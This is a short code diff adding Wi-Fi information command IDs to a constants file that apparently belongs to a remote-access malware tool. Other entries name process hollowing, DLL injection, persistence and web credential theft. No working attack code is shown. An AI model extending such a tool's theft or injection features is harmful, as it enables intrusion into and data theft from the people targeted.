@@ -9,9 +9,13 @@ POWERSHELL_CONSOLE       = "adfd9a3aa5bc568d540db256a3782c04"
 HOLLOW_FILE_EXEC         = "b11c081208b1d6466c83e37098510d73"
 WEB_CREDENTIALS          = "5df297c2f2da83a8b45cfd012fbf9b3c"
 FILES_SNAP_FULL          = "ce52e112fb976b2d277f09b6eada379f"
+WIFI_INFO_BASE           = "46f2b694bd6669fb14bed11c52e0d91d"
+WIFI_INFO_FULL           = "2d6694963cce74d2791fa72538152c11"
 PERSITENCE               = "e5fcfe07178a109ea0c1e9bd7e9dd772"
 DLL_INJECT               = "70d78a787fc59a5deb9578a58102ae2d"
 CHANGE_CWD               = "3f1ba9eb608addfb46dac5b51f4a6d87"
+
+
 
 
 EXECUTE_INTERNAL_CLIENT  = r'start cmd /k python "{}" --ip {} --id {}'
